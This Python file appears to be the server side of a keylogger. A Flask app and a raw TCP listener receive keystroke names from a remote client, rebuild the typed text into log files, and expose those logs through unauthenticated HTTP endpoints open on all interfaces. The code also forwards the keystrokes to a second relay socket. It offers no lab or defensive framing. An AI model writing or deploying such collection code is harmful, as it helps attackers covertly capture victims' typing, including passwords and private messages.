from flask import Flask, redirect, jsonify, request, make_response, send_file
from socket import *
import threading

app = Flask(__name__)
server_address =  ('127.0.0.1', 5001)
handle_server = ('127.0.0.1', 8374)
handle = socket(AF_INET, SOCK_STREAM)
keys = []
open('logs.txt', 'w')
open('rawlogs.txt', 'w')

@app.route('/api/logs', methods=['GET'])
def logs():
    return make_response(open('logs.txt', 'r').read(), 200)

@app.route('/api/rawlogs', methods=['GET'])
def rawlogs():
    return make_response(open('rawlogs.txt', 'r').read(), 200)

@app.route('/api/make_client', methods=["GET"])
def make_client():
    t2 = threading.Thread(target=handle_serverz)
    t2.daemon = True
    t2.start()
    return make_response("Ok", 200)

@app.route('/api/close_client', methods=["GET"])
def close_client():
    global handle
    try:
        handle.close()
        handle = socket(AF_INET, SOCK_STREAM)
        return make_response('Ok', 200)
    except:
        return make_response("Error", 400)

def logging(text):
    global keys 
    if text == 'Key.backspace':
        try:
            keys.pop(-1)
        except:
            keys.append(f' "{text}" ')
    elif text == "Key.space":
        try:
            keys.append(' ')
        except:
            keys.append(f' "{text}" ')
    elif text in ['Key.caps_lock', 'Key.ctrl_l', 'Key.ctrl_r', 'Key.ctrl', 'Key.enter']:
        keys.append(f' "{text}" ')
    else:
        keys.append(text)
    open('logs.txt', 'w').write(''.join(keys))
    open('rawlogs.txt', 'a').write(text)

def server_handle_response(text:bytes):
    try:
        handle.sendall(text)
    except:
        pass


def handle_data(connection: socket):
    try:
        while True:
            data = connection.recv(16)
            if data:
                logging(data.decode('utf-8'))
                server_handle_response(data)
    except Exception as e:
        print(e)
    finally:
        #Clean up connection
        connection.close()

def connection_server():
    sock = socket(AF_INET, SOCK_STREAM)
    sock.bind(server_address)
    sock.listen(5)

    while True:
        connection, address = sock.accept()
        print(address)
        threading.Thread(target=handle_data, args=(connection,)).start()

def handle_serverz():
    global handle
    try:
        handle.connect(handle_server)
    except:
        try:
            handle.close()
            handle = socket(AF_INET, SOCK_STREAM)
            handle.connect(handle_server)
        except:
            pass
if __name__ == "__main__":
    t = threading.Thread(target=connection_server)
    t.daemon = True
    t.start()
    app.run(debug=True, host='0.0.0.0', port=5000, use_reloader=False)